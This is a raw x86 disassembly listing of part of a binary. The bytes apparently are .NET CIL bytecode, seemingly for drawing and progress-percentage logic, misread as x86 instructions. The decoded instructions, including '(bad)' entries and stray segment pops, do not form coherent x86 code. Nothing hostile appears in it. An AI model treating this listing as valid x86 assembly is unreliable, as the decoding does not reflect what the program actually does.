10002b71:	dc 11                	fcoml  (%ecx)
10002b73:	04 17                	add    $0x17,%al
10002b75:	58                   	pop    %eax
10002b76:	13 04 11             	adc    (%ecx,%edx,1),%eax
10002b79:	04 1b                	add    $0x1b,%al
10002b7b:	3f                   	aas
10002b7c:	4d                   	dec    %ebp
10002b7d:	ff                   	(bad)
10002b7e:	ff                   	(bad)
10002b7f:	ff 2a                	ljmp   *(%edx)
10002b81:	00 00                	add    %al,(%eax)
10002b83:	00 01                	add    %al,(%ecx)
10002b85:	10 00                	adc    %al,(%eax)
10002b87:	00 02                	add    %al,(%edx)
10002b89:	00 b9 00 15 ce 00    	add    %bh,0xce1500(%ecx)
10002b8f:	0c 00                	or     $0x0,%al
10002b91:	00 00                	add    %al,(%eax)
10002b93:	00 1b                	add    %bl,(%ebx)
10002b95:	30 06                	xor    %al,(%esi)
10002b97:	00 e9                	add    %ch,%cl
10002b99:	00 00                	add    %al,(%eax)
10002b9b:	00 0a                	add    %cl,(%edx)
10002b9d:	00 00                	add    %al,(%eax)
10002b9f:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
10002ba2:	22 00                	and    (%eax),%al
10002ba4:	00 0a                	add    %cl,(%edx)
10002ba6:	1a 6f 23             	sbb    0x23(%edi),%ch
10002ba9:	00 00                	add    %al,(%eax)
10002bab:	0a 02                	or     (%edx),%al
10002bad:	7b 18                	jnp    0x10002bc7
10002baf:	00 00                	add    %al,(%eax)
10002bb1:	04 6f                	add    $0x6f,%al
10002bb3:	24 00                	and    $0x0,%al
10002bb5:	00 0a                	add    %cl,(%edx)
10002bb7:	18 5b 0a             	sbb    %bl,0xa(%ebx)
10002bba:	02 7b 18             	add    0x18(%ebx),%bh
10002bbd:	00 00                	add    %al,(%eax)
10002bbf:	04 6f                	add    $0x6f,%al
10002bc1:	25 00 00 0a 18       	and    $0x180a0000,%eax
10002bc6:	5b                   	pop    %ebx
10002bc7:	0b 1f                	or     (%edi),%ebx
10002bc9:	23 0c 1e             	and    (%esi,%ebx,1),%ecx
10002bcc:	0d 16 13 04 38       	or     $0x38041316,%eax
10002bd1:	ab                   	stos   %eax,%es:(%edi)
10002bd2:	00 00                	add    %al,(%eax)
10002bd4:	00 02                	add    %al,(%edx)
10002bd6:	7b 1d                	jnp    0x10002bf5
10002bd8:	00 00                	add    %al,(%eax)
10002bda:	04 11                	add    $0x11,%al
10002bdc:	04 6c                	add    $0x6c,%al
10002bde:	23 18                	and    (%eax),%ebx
10002be0:	2d 44 54 fb 21       	sub    $0x21fb5444,%eax
10002be5:	09 40 5a             	or     %eax,0x5a(%eax)
10002be8:	23 00                	and    (%eax),%eax
10002bea:	00 00                	add    %al,(%eax)
10002bec:	00 00                	add    %al,(%eax)
10002bee:	00 00                	add    %al,(%eax)
10002bf0:	40                   	inc    %eax
10002bf1:	5a                   	pop    %edx
10002bf2:	23 00                	and    (%eax),%eax
10002bf4:	00 00                	add    %al,(%eax)
10002bf6:	00 00                	add    %al,(%eax)
10002bf8:	00 14 40             	add    %dl,(%eax,%eax,2)
10002bfb:	5b                   	pop    %ebx
10002bfc:	58                   	pop    %eax
10002bfd:	13 05 06 08 6c 11    	adc    0x116c0806,%eax
10002c03:	05 28 26 00 00       	add    $0x2628,%eax
10002c08:	0a 5a 69             	or     0x69(%edx),%bl
10002c0b:	58                   	pop    %eax
10002c0c:	09 18                	or     %ebx,(%eax)
10002c0e:	5b                   	pop    %ebx
10002c0f:	59                   	pop    %ecx
10002c10:	13 06                	adc    (%esi),%eax
10002c12:	07                   	pop    %es
10002c13:	08 6c 11 05          	or     %ch,0x5(%ecx,%edx,1)
10002c17:	28 27                	sub    %ah,(%edi)
10002c19:	00 00                	add    %al,(%eax)
10002c1b:	0a 5a 69             	or     0x69(%edx),%bl
10002c1e:	58                   	pop    %eax
10002c1f:	09 18                	or     %ebx,(%eax)
10002c21:	5b                   	pop    %ebx
10002c22:	59                   	pop    %ecx
10002c23:	13 07                	adc    (%edi),%eax
10002c25:	20 ff                	and    %bh,%bh
10002c27:	00 00                	add    %al,(%eax)
10002c29:	00 11                	add    %dl,(%ecx)
10002c2b:	04 1f                	add    $0x1f,%al
10002c2d:	2d 5a 59 13 08       	sub    $0x813595a,%eax
10002c32:	11 08                	adc    %ecx,(%eax)
10002c34:	1f                   	pop    %ds
10002c35:	32 2f                	xor    (%edi),%ch
10002c37:	04 1f                	add    $0x1f,%al
10002c39:	32 13                	xor    (%ebx),%dl
10002c3b:	08 11                	or     %dl,(%ecx)
10002c3d:	08 20                	or     %ah,(%eax)
10002c3f:	ff 00                	incl   (%eax)
10002c41:	00 00                	add    %al,(%eax)
10002c43:	20 ff                	and    %bh,%bh
10002c45:	00 00                	add    %al,(%eax)
10002c47:	00 20                	add    %ah,(%eax)
10002c49:	ff 00                	incl   (%eax)
10002c4b:	00 00                	add    %al,(%eax)
10002c4d:	28 28                	sub    %ch,(%eax)
10002c4f:	00 00                	add    %al,(%eax)
10002c51:	0a 73 29             	or     0x29(%ebx),%dh
10002c54:	00 00                	add    %al,(%eax)
10002c56:	0a 13                	or     (%ebx),%dl
10002c58:	09 04 6f             	or     %eax,(%edi,%ebp,2)
10002c5b:	22 00                	and    (%eax),%al
10002c5d:	00 0a                	add    %cl,(%edx)
10002c5f:	11 09                	adc    %ecx,(%ecx)
10002c61:	11 06                	adc    %eax,(%esi)
10002c63:	11 07                	adc    %eax,(%edi)
10002c65:	09 09                	or     %ecx,(%ecx)
10002c67:	6f                   	outsl  %ds:(%esi),(%dx)
10002c68:	2a 00                	sub    (%eax),%al
10002c6a:	00 0a                	add    %cl,(%edx)
10002c6c:	de 0c 11             	fimuls (%ecx,%edx,1)
10002c6f:	09 2c 07             	or     %ebp,(%edi,%eax,1)
10002c72:	11 09                	adc    %ecx,(%ecx)
10002c74:	6f                   	outsl  %ds:(%esi),(%dx)
10002c75:	2b 00                	sub    (%eax),%eax
10002c77:	00 0a                	add    %cl,(%edx)
10002c79:	dc 11                	fcoml  (%ecx)
10002c7b:	04 17                	add    $0x17,%al
10002c7d:	58                   	pop    %eax
10002c7e:	13 04 11             	adc    (%ecx,%edx,1),%eax
10002c81:	04 1b                	add    $0x1b,%al
10002c83:	3f                   	aas
10002c84:	4d                   	dec    %ebp
10002c85:	ff                   	(bad)
10002c86:	ff                   	(bad)
10002c87:	ff 2a                	ljmp   *(%edx)
10002c89:	00 00                	add    %al,(%eax)
10002c8b:	00 01                	add    %al,(%ecx)
10002c8d:	10 00                	adc    %al,(%eax)
10002c8f:	00 02                	add    %al,(%edx)
10002c91:	00 b9 00 15 ce 00    	add    %bh,0xce1500(%ecx)
10002c97:	0c 00                	or     $0x0,%al
10002c99:	00 00                	add    %al,(%eax)
10002c9b:	00 1b                	add    %bl,(%ebx)
10002c9d:	30 08                	xor    %cl,(%eax)
10002c9f:	00 c8                	add    %cl,%al
10002ca1:	00 00                	add    %al,(%eax)
10002ca3:	00 0b                	add    %cl,(%ebx)
10002ca5:	00 00                	add    %al,(%eax)
10002ca7:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
10002caa:	22 00                	and    (%eax),%al
10002cac:	00 0a                	add    %cl,(%edx)
10002cae:	1a 6f 23             	sbb    0x23(%edi),%ch
10002cb1:	00 00                	add    %al,(%eax)
10002cb3:	0a 1f                	or     (%edi),%bl
10002cb5:	23 0a                	and    (%edx),%ecx
10002cb7:	1f                   	pop    %ds
10002cb8:	23 0b                	and    (%ebx),%ecx
10002cba:	1f                   	pop    %ds
10002cbb:	1c 0c                	sbb    $0xc,%al
10002cbd:	19 0d 1f 3c 02 7b    	sbb    %ecx,0x7b023c1f
10002cc3:	21 00                	and    %eax,(%eax)
10002cc5:	00 04 28             	add    %al,(%eax,%ebp,1)
10002cc8:	2c 00                	sub    $0x0,%al
10002cca:	00 0a                	add    %cl,(%edx)
10002ccc:	09 6b 73             	or     %ebp,0x73(%ebx)
10002ccf:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
10002cd4:	04 04                	add    $0x4,%al
10002cd6:	6f                   	outsl  %ds:(%esi),(%dx)
10002cd7:	22 00                	and    (%eax),%al
10002cd9:	00 0a                	add    %cl,(%edx)
10002cdb:	11 04 06             	adc    %eax,(%esi,%eax,1)
10002cde:	08 59 07             	or     %bl,0x7(%ecx)
10002ce1:	08 59 08             	or     %bl,0x8(%ecx)
10002ce4:	18 5a 08             	sbb    %bl,0x8(%edx)
10002ce7:	18 5a 6f             	sbb    %bl,0x6f(%edx)
10002cea:	2e 00 00             	add    %al,%cs:(%eax)
10002ced:	0a de                	or     %dh,%bl
10002cef:	0c 11                	or     $0x11,%al
10002cf1:	04 2c                	add    $0x2c,%al
10002cf3:	07                   	pop    %es
10002cf4:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
10002cf7:	2b 00                	sub    (%eax),%eax
10002cf9:	00 0a                	add    %cl,(%edx)
10002cfb:	dc 02                	faddl  (%edx)
10002cfd:	7b 22                	jnp    0x10002d21
10002cff:	00 00                	add    %al,(%eax)
10002d01:	04 09                	add    $0x9,%al
10002d03:	6b 73 2d 00          	imul   $0x0,0x2d(%ebx),%esi
10002d07:	00 0a                	add    %cl,(%edx)
10002d09:	13 05 11 05 18 6f    	adc    0x6f180511,%eax
10002d0f:	2f                   	das
10002d10:	00 00                	add    %al,(%eax)
10002d12:	0a 11                	or     (%ecx),%dl
10002d14:	05 18 6f 30 00       	add    $0x306f18,%eax
10002d19:	00 0a                	add    %cl,(%edx)
10002d1b:	02 7b 20             	add    0x20(%ebx),%bh
10002d1e:	00 00                	add    %al,(%eax)
10002d20:	04 7b                	add    $0x7b,%al
10002d22:	1d 00 00 04 23       	sbb    $0x23040000,%eax
10002d27:	00 00                	add    %al,(%eax)
10002d29:	00 00                	add    %al,(%eax)
10002d2b:	00 80 66 40 5a 23    	add    %al,0x235a4066(%eax)
10002d31:	18 2d 44 54 fb 21    	sbb    %ch,0x21fb5444
10002d37:	09 40 5b             	or     %eax,0x5b(%eax)
10002d3a:	6b 13 06             	imul   $0x6,(%ebx),%edx
10002d3d:	04 6f                	add    $0x6f,%al
10002d3f:	22 00                	and    (%eax),%al
10002d41:	00 0a                	add    %cl,(%edx)
10002d43:	11 05 06 08 59 6b    	adc    %eax,0x6b590806
10002d49:	07                   	pop    %es
10002d4a:	08 59 6b             	or     %bl,0x6b(%ecx)
10002d4d:	08 18                	or     %bl,(%eax)
10002d4f:	5a                   	pop    %edx
10002d50:	6b 08 18             	imul   $0x18,(%eax),%ecx
10002d53:	5a                   	pop    %edx
10002d54:	6b 11 06             	imul   $0x6,(%ecx),%edx
10002d57:	22 00                	and    (%eax),%al
10002d59:	00 b4 42 6f 31 00 00 	add    %dh,0x316f(%edx,%eax,2)
10002d60:	0a de                	or     %dh,%bl
10002d62:	0c 11                	or     $0x11,%al
10002d64:	05 2c 07 11 05       	add    $0x511072c,%eax
10002d69:	6f                   	outsl  %ds:(%esi),(%dx)
10002d6a:	2b 00                	sub    (%eax),%eax
10002d6c:	00 0a                	add    %cl,(%edx)
10002d6e:	dc 2a                	fsubrl (%edx)
10002d70:	01 1c 00             	add    %ebx,(%eax,%eax,1)
10002d73:	00 02                	add    %al,(%edx)
10002d75:	00 2d 00 1b 48 00    	add    %ch,0x481b00
10002d7b:	0c 00                	or     $0x0,%al
10002d7d:	00 00                	add    %al,(%eax)
10002d7f:	00 02                	add    %al,(%edx)
10002d81:	00 63 00             	add    %ah,0x0(%ebx)
10002d84:	58                   	pop    %eax
10002d85:	bb 00 0c 00 00       	mov    $0xc00,%ebx
10002d8a:	00 00                	add    %al,(%eax)
10002d8c:	1b 30                	sbb    (%eax),%esi
10002d8e:	07                   	pop    %es
10002d8f:	00 0d 01 00 00 04    	add    %cl,0x4000001
10002d95:	00 00                	add    %al,(%eax)
10002d97:	11 02                	adc    %eax,(%edx)
10002d99:	25 7b 29 00 00       	and    $0x297b,%eax
10002d9e:	04 17                	add    $0x17,%al
10002da0:	58                   	pop    %eax
10002da1:	7d 29                	jge    0x10002dcc
10002da3:	00 00                	add    %al,(%eax)
10002da5:	04 02                	add    $0x2,%al
10002da7:	7b 20                	jnp    0x10002dc9
10002da9:	00 00                	add    %al,(%eax)
10002dab:	04 25                	add    $0x25,%al
10002dad:	7b 1d                	jnp    0x10002dcc
10002daf:	00 00                	add    %al,(%eax)
10002db1:	04 23                	add    $0x23,%al
10002db3:	9a 99 99 99 99 99 b9 	lcall  $0xb999,$0x99999999
10002dba:	3f                   	aas
10002dbb:	59                   	pop    %ecx
10002dbc:	7d 1d                	jge    0x10002ddb
10002dbe:	00 00                	add    %al,(%eax)
10002dc0:	04 02                	add    $0x2,%al
10002dc2:	7b 20                	jnp    0x10002de4
10002dc4:	00 00                	add    %al,(%eax)
10002dc6:	04 7b                	add    $0x7b,%al
10002dc8:	18 00                	sbb    %al,(%eax)
10002dca:	00 04 6f             	add    %al,(%edi,%ebp,2)
10002dcd:	32 00                	xor    (%eax),%al
10002dcf:	00 0a                	add    %cl,(%edx)
10002dd1:	02 7b 29             	add    0x29(%ebx),%bh
10002dd4:	00 00                	add    %al,(%eax)
10002dd6:	04 1f                	add    $0x1f,%al
10002dd8:	28 5d 2d             	sub    %bl,0x2d(%ebp)
10002ddb:	5e                   	pop    %esi
10002ddc:	02 7b 28             	add    0x28(%ebx),%bh
10002ddf:	00 00                	add    %al,(%eax)
10002de1:	04 1f                	add    $0x1f,%al
10002de3:	63 2f                	arpl   %ebp,(%edi)
10002de5:	54                   	push   %esp
10002de6:	02 25 7b 28 00 00    	add    0x287b,%ah
10002dec:	04 17                	add    $0x17,%al
10002dee:	58                   	pop    %eax
10002def:	7d 28                	jge    0x10002e19
10002df1:	00 00                	add    %al,(%eax)
10002df3:	04 02                	add    $0x2,%al
10002df5:	7b 23                	jnp    0x10002e1a
10002df7:	00 00                	add    %al,(%eax)
10002df9:	04 02                	add    $0x2,%al
10002dfb:	7b 28                	jnp    0x10002e25
10002dfd:	00 00                	add    %al,(%eax)
10002dff:	04 5a                	add    $0x5a,%al
10002e01:	6c                   	insb   (%dx),%es:(%edi)
10002e02:	23 00                	and    (%eax),%eax
10002e04:	00 00                	add    %al,(%eax)
10002e06:	00 00                	add    %al,(%eax)
10002e08:	00 59 40             	add    %bl,0x40(%ecx)
10002e0b:	5b                   	pop    %ebx
10002e0c:	69 0a 02 7b 24 00    	imul   $0x247b02,(%edx),%ecx
10002e12:	00 04 06             	add    %al,(%esi,%eax,1)
10002e15:	6f                   	outsl  %ds:(%esi),(%dx)
10002e16:	33 00                	xor    (%eax),%eax
10002e18:	00 0a                	add    %cl,(%edx)
10002e1a:	02 7b 25             	add    0x25(%ebx),%bh
10002e1d:	00 00                	add    %al,(%eax)
10002e1f:	04 02                	add    $0x2,%al
10002e21:	7b 28                	jnp    0x10002e4b
10002e23:	00 00                	add    %al,(%eax)
10002e25:	04 8c                	add    $0x8c,%al
10002e27:	15 00 00 01 72       	adc    $0x72010000,%eax
10002e2c:	41                   	inc    %ecx
10002e2d:	00 00                	add    %al,(%eax)
10002e2f:	70 28                	jo     0x10002e59
10002e31:	34 00                	xor    $0x0,%al
10002e33:	00 0a                	add    %cl,(%edx)
10002e35:	6f                   	outsl  %ds:(%esi),(%dx)
10002e36:	35 00 00 0a 02       	xor    $0x20a0000,%eax
10002e3b:	7b 29                	jnp    0x10002e66
10002e3d:	00 00                	add    %al,(%eax)
10002e3f:	04 1f                	add    $0x1f,%al
10002e41:	64 5d                	fs pop %ebp
10002e43:	2d 34 02 02 7b       	sub    $0x7b020234,%eax
10002e48:	27                   	daa
10002e49:	00 00                	add    %al,(%eax)
10002e4b:	04 17                	add    $0x17,%al
10002e4d:	58                   	pop    %eax
10002e4e:	02 7b 26             	add    0x26(%ebx),%bh
10002e51:	00 00                	add    %al,(%eax)
10002e53:	04 8e                	add    $0x8e,%al
10002e55:	69 5d 7d 27 00 00 04 	imul   $0x4000027,0x7d(%ebp),%ebx
10002e5c:	02 7b 20             	add    0x20(%ebx),%bh
10002e5f:	00 00                	add    %al,(%eax)
10002e61:	04 7b                	add    $0x7b,%al
10002e63:	1b 00                	sbb    (%eax),%eax
10002e65:	00 04 02             	add    %al,(%edx,%eax,1)
10002e68:	7b 26                	jnp    0x10002e90
10002e6a:	00 00                	add    %al,(%eax)
10002e6c:	04 02                	add    $0x2,%al
10002e6e:	7b 27                	jnp    0x10002e97
10002e70:	00 00                	add    %al,(%eax)
10002e72:	04 9a                	add    $0x9a,%al
10002e74:	6f                   	outsl  %ds:(%esi),(%dx)
10002e75:	35 00 00 0a 7e       	xor    $0x7e0a0000,%eax
10002e7a:	0e                   	push   %cs
10002e7b:	00 00                	add    %al,(%eax)
10002e7d:	04 17                	add    $0x17,%al
10002e7f:	6f                   	outsl  %ds:(%esi),(%dx)
10002e80:	36 00 00             	add    %al,%ss:(%eax)
10002e83:	0a 7e 0e             	or     0xe(%esi),%bh
10002e86:	00 00                	add    %al,(%eax)
10002e88:	04 6f                	add    $0x6f,%al
10002e8a:	37                   	aaa
10002e8b:	00 00                	add    %al,(%eax)
10002e8d:	0a 7e 0d             	or     0xd(%esi),%bh
10002e90:	00 00                	add    %al,(%eax)
10002e92:	04 16                	add    $0x16,%al
10002e94:	16                   	push   %ss
10002e95:	16                   	push   %ss
10002e96:	16                   	push   %ss
10002e97:	1f                   	pop    %ds
10002e98:	43                   	inc    %ebx
10002e99:	28 2e                	sub    %ch,(%esi)
10002e9b:	00 00                	add    %al,(%eax)
10002e9d:	06                   	push   %es
10002e9e:	26 de 03             	fiadds %es:(%ebx)
10002ea1:	26 de 00             	fiadds %es:(%eax)
10002ea4:	2a 00                	sub    (%eax),%al
10002ea6:	00 00                	add    %al,(%eax)
10002ea8:	41                   	inc    %ecx
10002ea9:	1c 00                	sbb    $0x0,%al
	...
10002eb3:	00 09                	add    %cl,(%ecx)
10002eb5:	01 00                	add    %eax,(%eax)
10002eb7:	00 09                	add    %cl,(%ecx)
10002eb9:	01 00                	add    %eax,(%eax)
10002ebb:	00 03                	add    %al,(%ebx)
10002ebd:	00 00                	add    %al,(%eax)
10002ebf:	00 01                	add    %al,(%ecx)
10002ec1:	00 00                	add    %al,(%eax)
10002ec3:	01 1b                	add    %ebx,(%ebx)
10002ec5:	30 07                	xor    %al,(%edi)
10002ec7:	00 c2                	add    %al,%dl
10002ec9:	03 00                	add    (%eax),%eax
10002ecb:	00 0c 00             	add    %cl,(%eax,%eax,1)
10002ece:	00 11                	add    %dl,(%ecx)
10002ed0:	02 25 7b 38 00 00    	add    0x387b,%ah
10002ed6:	04 17                	add    $0x17,%al
10002ed8:	58                   	pop    %eax
10002ed9:	7d 38                	jge    0x10002f13
10002edb:	00 00                	add    %al,(%eax)
10002edd:	04 02                	add    $0x2,%al
10002edf:	7b 37                	jnp    0x10002f18
10002ee1:	00 00                	add    %al,(%eax)
10002ee3:	04 1a                	add    $0x1a,%al
10002ee5:	3c 3d                	cmp    $0x3d,%al
10002ee7:	02 00                	add    (%eax),%al
10002ee9:	00 02                	add    %al,(%edx)
10002eeb:	7b 36                	jnp    0x10002f23
10002eed:	00 00                	add    %al,(%eax)
10002eef:	04 02                	add    $0x2,%al
10002ef1:	7b 37                	jnp    0x10002f2a
10002ef3:	00 00                	add    %al,(%eax)
10002ef5:	04 94                	add    $0x94,%al
10002ef7:	1f                   	pop    %ds
10002ef8:	64 3c 29             	fs cmp $0x29,%al
10002efb:	02 00                	add    (%eax),%al
10002efd:	00 02                	add    %al,(%edx)
10002eff:	7b 36                	jnp    0x10002f37
10002f01:	00 00                	add    %al,(%eax)
10002f03:	04 02                	add    $0x2,%al
10002f05:	7b 37                	jnp    0x10002f3e
10002f07:	00 00                	add    %al,(%eax)
10002f09:	04 8f                	add    $0x8f,%al
10002f0b:	15 00 00 01 25       	adc    $0x25010000,%eax
10002f10:	71 15                	jno    0x10002f27
10002f12:	00 00                	add    %al,(%eax)
10002f14:	01 17                	add    %edx,(%edi)
10002f16:	58                   	pop    %eax
10002f17:	81 15 00 00 01 02 7b 	adcl   $0x2e7b,0x2010000
10002f1e:	2e 00 00 
10002f21:	04 02                	add    $0x2,%al
10002f23:	7b 37                	jnp    0x10002f5c
10002f25:	00 00                	add    %al,(%eax)
10002f27:	04 9a                	add    $0x9a,%al
10002f29:	6f                   	outsl  %ds:(%esi),(%dx)
10002f2a:	24 00                	and    $0x0,%al
10002f2c:	00 0a                	add    %cl,(%edx)
10002f2e:	02 7b 36             	add    0x36(%ebx),%bh
10002f31:	00 00                	add    %al,(%eax)
10002f33:	04 02                	add    $0x2,%al
10002f35:	7b 37                	jnp    0x10002f6e
10002f37:	00 00                	add    %al,(%eax)
10002f39:	04 94                	add    $0x94,%al
10002f3b:	5a                   	pop    %edx
10002f3c:	6c                   	insb   (%dx),%es:(%edi)
10002f3d:	23 00                	and    (%eax),%eax
10002f3f:	00 00                	add    %al,(%eax)
10002f41:	00 00                	add    %al,(%eax)
10002f43:	00 59 40             	add    %bl,0x40(%ecx)
10002f46:	5b                   	pop    %ebx
10002f47:	69 0a 02 7b 2f 00    	imul   $0x2f7b02,(%edx),%ecx
10002f4d:	00 04 02             	add    %al,(%edx,%eax,1)
10002f50:	7b 37                	jnp    0x10002f89
10002f52:	00 00                	add    %al,(%eax)
10002f54:	04 9a                	add    $0x9a,%al
10002f56:	06                   	push   %es
10002f57:	6f                   	outsl  %ds:(%esi),(%dx)
10002f58:	33 00                	xor    (%eax),%eax
10002f5a:	00 0a                	add    %cl,(%edx)
10002f5c:	02 7b 2b             	add    0x2b(%ebx),%bh
10002f5f:	00 00                	add    %al,(%eax)
10002f61:	04 02                	add    $0x2,%al
10002f63:	7b 37                	jnp    0x10002f9c
10002f65:	00 00                	add    %al,(%eax)
10002f67:	04 9a                	add    $0x9a,%al
10002f69:	02 7b 36             	add    0x36(%ebx),%bh
10002f6c:	00 00                	add    %al,(%eax)
10002f6e:	04 02                	add    $0x2,%al
10002f70:	7b 37                	jnp    0x10002fa9
10002f72:	00 00                	add    %al,(%eax)
10002f74:	04 94                	add    $0x94,%al
10002f76:	8c 15 00 00 01 72    	mov    %ss,0x72010000
10002f7c:	41                   	inc    %ecx
10002f7d:	00 00                	add    %al,(%eax)
10002f7f:	70 28                	jo     0x10002fa9
10002f81:	34 00                	xor    $0x0,%al
10002f83:	00 0a                	add    %cl,(%edx)
10002f85:	6f                   	outsl  %ds:(%esi),(%dx)
10002f86:	35 00 00 0a 02       	xor    $0x20a0000,%eax
10002f8b:	7b 36                	jnp    0x10002fc3
10002f8d:	00 00                	add    %al,(%eax)
10002f8f:	04 02                	add    $0x2,%al
10002f91:	7b 37                	jnp    0x10002fca
10002f93:	00 00                	add    %al,(%eax)
10002f95:	04 94                	add    $0x94,%al
10002f97:	1f                   	pop    %ds
10002f98:	1a 5b 1a             	sbb    0x1a(%ebx),%bl
10002f9b:	5d                   	pop    %ebp
10002f9c:	0b 02                	or     (%edx),%eax
10002f9e:	7b 2c                	jnp    0x10002fcc
10002fa0:	00 00                	add    %al,(%eax)
10002fa2:	04 02                	add    $0x2,%al
10002fa4:	7b 37                	jnp    0x10002fdd
10002fa6:	00 00                	add    %al,(%eax)
10002fa8:	04 9a                	add    $0x9a,%al
10002faa:	02 7b 31             	add    0x31(%ebx),%bh
10002fad:	00 00                	add    %al,(%eax)
10002faf:	04 02                	add    $0x2,%al
10002fb1:	7b 37                	jnp    0x10002fea
10002fb3:	00 00                	add    %al,(%eax)
10002fb5:	04 9a                	add    $0x9a,%al
10002fb7:	07                   	pop    %es
10002fb8:	9a 6f 35 00 00 0a 02 	lcall  $0x20a,$0x356f
10002fbf:	7b 37                	jnp    0x10002ff8
10002fc1:	00 00                	add    %al,(%eax)
10002fc3:	04 17                	add    $0x17,%al
10002fc5:	33 4f 02             	xor    0x2(%edi),%ecx
10002fc8:	7b 36                	jnp    0x10003000
10002fca:	00 00                	add    %al,(%eax)
10002fcc:	04 17                	add    $0x17,%al
10002fce:	94                   	xchg   %eax,%esp
10002fcf:	1f                   	pop    %ds
10002fd0:	0a 31                	or     (%ecx),%dh
10002fd2:	43                   	inc    %ebx
10002fd3:	02 7b 36             	add    0x36(%ebx),%bh
10002fd6:	00 00                	add    %al,(%eax)
10002fd8:	04 17                	add    $0x17,%al
10002fda:	94                   	xchg   %eax,%esp
10002fdb:	1f                   	pop    %ds
10002fdc:	5a                   	pop    %edx
10002fdd:	2f                   	das
10002fde:	37                   	aaa
10002fdf:	02 7b 36             	add    0x36(%ebx),%bh
10002fe2:	00 00                	add    %al,(%eax)
10002fe4:	04 17                	add    $0x17,%al
10002fe6:	94                   	xchg   %eax,%esp
10002fe7:	6c                   	insb   (%dx),%es:(%edi)
10002fe8:	23 85 eb 51 b8 1e    	and    0x1eb851eb(%ebp),%eax
10002fee:	e5 7d                	in     $0x7d,%eax
10002ff0:	40                   	inc    %eax
10002ff1:	5a                   	pop    %edx
10002ff2:	69 0c 02 7b 2c 00 00 	imul   $0x2c7b,(%edx,%eax,1),%ecx
10002ff9:	04 17                	add    $0x17,%al
10002ffb:	9a 72 a9 00 00 70 08 	lcall  $0x870,$0xa972
10003002:	8c 15 00 00 01 72    	mov    %ss,0x72010000
10003008:	cd 00                	int    $0x0
1000300a:	00 70 28             	add    %dh,0x28(%eax)
1000300d:	38 00                	cmp    %al,(%eax)
1000300f:	00 0a                	add    %cl,(%edx)
10003011:	6f                   	outsl  %ds:(%esi),(%dx)
10003012:	35 00 00 0a 02       	xor    $0x20a0000,%eax
10003017:	7b 36                	jnp    0x1000304f
10003019:	00 00                	add    %al,(%eax)
1000301b:	04 02                	add    $0x2,%al
1000301d:	7b 37                	jnp    0x10003056
1000301f:	00 00                	add    %al,(%eax)
10003021:	04 94                	add    $0x94,%al
10003023:	1f                   	pop    %ds
10003024:	64 3f                	fs aas
10003026:	fd                   	std
10003027:	00 00                	add    %al,(%eax)
10003029:	00 02                	add    %al,(%edx)
1000302b:	7b 2f                	jnp    0x1000305c
1000302d:	00 00                	add    %al,(%eax)
1000302f:	04 02                	add    $0x2,%al
10003031:	7b 37                	jnp    0x1000306a
10003033:	00 00                	add    %al,(%eax)
10003035:	04 9a                	add    $0x9a,%al
10003037:	1f                   	pop    %ds
10003038:	0a 20                	or     (%eax),%ah
1000303a:	bf 00 00 00 20       	mov    $0x20000000,%edi
1000303f:	83 00 00             	addl   $0x0,(%eax)
10003042:	00 28                	add    %ch,(%eax)
10003044:	39 00                	cmp    %eax,(%eax)
10003046:	00 0a                	add    %cl,(%edx)
10003048:	6f                   	outsl  %ds:(%esi),(%dx)
10003049:	3a 00                	cmp    (%eax),%al
1000304b:	00 0a                	add    %cl,(%edx)
1000304d:	02 7b 30             	add    0x30(%ebx),%bh
10003050:	00 00                	add    %al,(%eax)
10003052:	04 02                	add    $0x2,%al
10003054:	7b 37                	jnp    0x1000308d
10003056:	00 00                	add    %al,(%eax)
10003058:	04 9a                	add    $0x9a,%al
1000305a:	16                   	push   %ss
1000305b:	6f                   	outsl  %ds:(%esi),(%dx)
1000305c:	3b 00                	cmp    (%eax),%eax
1000305e:	00 0a                	add    %cl,(%edx)
10003060:	02 7b 2d             	add    0x2d(%ebx),%bh
10003063:	00 00                	add    %al,(%eax)
10003065:	04 02                	add    $0x2,%al
10003067:	7b 37                	jnp    0x100030a0
10003069:	00 00                	add    %al,(%eax)
1000306b:	04 9a                	add    $0x9a,%al
1000306d:	72 f5                	jb     0x10003064
1000306f:	00 00                	add    %al,(%eax)
10003071:	70 6f                	jo     0x100030e2
10003073:	35 00 00 0a 02       	xor    $0x20a0000,%eax
10003078:	7b 2d                	jnp    0x100030a7
1000307a:	00 00                	add    %al,(%eax)
1000307c:	04 02                	add    $0x2,%al
1000307e:	7b 37                	jnp    0x100030b7
10003080:	00 00                	add    %al,(%eax)
10003082:	04 9a                	add    $0x9a,%al
10003084:	17                   	pop    %ss
10003085:	6f                   	outsl  %ds:(%esi),(%dx)
10003086:	3b 00                	cmp    (%eax),%eax
10003088:	00 0a                	add    %cl,(%edx)
1000308a:	02 7b 2c             	add    0x2c(%ebx),%bh
1000308d:	00 00                	add    %al,(%eax)
1000308f:	04 02                	add    $0x2,%al
10003091:	7b 37                	jnp    0x100030ca
10003093:	00 00                	add    %al,(%eax)
10003095:	04 9a                	add    $0x9a,%al
10003097:	72 fb                	jb     0x10003094
10003099:	00 00                	add    %al,(%eax)
1000309b:	70 6f                	jo     0x1000310c
1000309d:	35 00 00 0a 02       	xor    $0x20a0000,%eax
100030a2:	7b 2c                	jnp    0x100030d0
100030a4:	00 00                	add    %al,(%eax)
100030a6:	04 02                	add    $0x2,%al
100030a8:	7b 37                	jnp    0x100030e1
100030aa:	00 00                	add    %al,(%eax)
100030ac:	04 9a                	add    $0x9a,%al
100030ae:	1f                   	pop    %ds
100030af:	0a 20                	or     (%eax),%ah
100030b1:	bf 00 00 00 20       	mov    $0x20000000,%edi
100030b6:	83 00 00             	addl   $0x0,(%eax)
100030b9:	00 28                	add    %ch,(%eax)
100030bb:	39 00                	cmp    %eax,(%eax)
100030bd:	00 0a                	add    %cl,(%edx)
100030bf:	6f                   	outsl  %ds:(%esi),(%dx)
100030c0:	3c 00                	cmp    $0x0,%al
100030c2:	00 0a                	add    %cl,(%edx)
100030c4:	02 7b 37             	add    0x37(%ebx),%bh
100030c7:	00 00                	add    %al,(%eax)
100030c9:	04 19                	add    $0x19,%al
100030cb:	2f                   	das
100030cc:	10 02                	adc    %al,(%edx)
100030ce:	25 7b 37 00 00       	and    $0x377b,%eax
100030d3:	04 17                	add    $0x17,%al
100030d5:	58                   	pop    %eax
100030d6:	7d 37                	jge    0x1000310f
100030d8:	00 00                	add    %al,(%eax)
